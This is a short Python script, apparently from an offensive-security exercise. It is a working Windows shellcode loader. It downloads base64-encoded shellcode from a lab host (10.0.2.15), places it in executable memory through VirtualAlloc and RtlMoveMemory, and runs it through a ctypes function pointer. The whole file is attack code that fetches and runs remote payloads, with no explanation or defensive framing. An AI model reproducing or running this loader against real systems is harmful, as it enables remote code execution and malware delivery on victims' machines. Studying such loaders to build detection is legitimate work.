from urllib import request
import base64
import ctypes

kernel32 = ctypes.windll.kernel32

def get_code(url):
    with request.urlopen(url) as response:
        shellcode = base64.decodebytes(response.read())
    return shellcode

def write_memory(buf):
    length = len(buf)

    kernel32.VirtualAlloc.restype = ctypes.c_void_p
    kernel32.VirtualAlloc.argtypes = (ctypes.c_void_p, ctypes.c_size_t, ctypes.c_uint32, ctypes.c_uint32)
    ptr = kernel32.VirtualAlloc(None, length, 0x3000, 0x40)  # MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
    
    kernel32.RtlMoveMemory.argtypes = (ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t)
    kernel32.RtlMoveMemory(ptr, buf, length)
    return ptr

def run(shellcode):
    buffer = ctypes.create_string_buffer(shellcode)
    ptr = write_memory(buffer)
    shell_func = ctypes.CFUNCTYPE(None)(ptr)
    shell_func()

if __name__ == '__main__':
    url = "http://10.0.2.15/shellcode.bin"
    shellcode = get_code(url)
    run(shellcode)
